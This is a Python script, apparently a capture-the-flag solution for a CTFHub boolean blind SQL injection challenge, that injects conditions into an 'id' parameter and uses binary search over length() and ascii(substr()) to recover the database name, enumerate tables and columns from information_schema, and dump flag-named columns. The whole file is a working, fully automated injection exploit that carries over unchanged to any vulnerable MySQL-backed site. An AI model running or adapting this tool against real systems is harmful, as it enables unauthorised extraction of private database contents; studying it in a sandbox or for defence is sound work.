# CTFHub boolean blind - automated extraction
# oracle: page contains "query_success" when the WHERE clause matches a row
import sys
import time
import requests

URL = "http://challenge-95fb3e6f4b4f2835.sandbox.ctfhub.com:10800/"
S = requests.Session()
COUNT = [0]


def success(expr):
    payload = "1 and " + expr
    last = None
    for _ in range(3):
        try:
            r = S.get(URL, params={"id": payload}, timeout=10)
            COUNT[0] += 1
            return "query_success" in r.text
        except Exception as e:
            last = e
            time.sleep(1)
    raise RuntimeError("request failed: %s (%s)" % (expr, last))


def length_of(expr):
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi) // 2
        if success("length((%s)) > %d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def char_at(expr, pos):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if success("ascii(substr((%s),%d,1)) > %d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def string_of(expr, maxlen=200):
    n = length_of(expr)
    if n <= 0 or n > maxlen:
        return ""
    out = []
    for i in range(1, n + 1):
        out.append(char_at(expr, i))
    return "".join(out)


def list_names(sql, maxn=30):
    names = []
    for i in range(maxn):
        name = string_of("%s limit %d,1" % (sql, i))
        if not name:
            break
        names.append(name)
        print("    [%d] %s  (requests=%d)" % (i, name, COUNT[0]))
        sys.stdout.flush()
    return names


def main():
    db = string_of("database()")
    print("[+] database = %s  (len=%d, requests=%d)" % (db, len(db), COUNT[0]))

    print("[*] tables:")
    tabs = list_names("select table_name from information_schema.tables where table_schema=database()")

    all_cols = {}
    for t in tabs:
        print("[*] columns of %s:" % t)
        cols = list_names(
            "select column_name from information_schema.columns where table_schema=database() and table_name='%s'" % t
        )
        all_cols[t] = cols

    # dump any column whose table/column name contains "flag"
    for t in tabs:
        for c in all_cols.get(t, []):
            if "flag" in (t + c).lower():
                val = string_of("select `%s` from `%s` limit 0,1" % (c, t), 300)
                print("[+] FLAG %s.%s = %s" % (t, c, val))

    print("[+] total requests = %d" % COUNT[0])


if __name__ == "__main__":
    main()
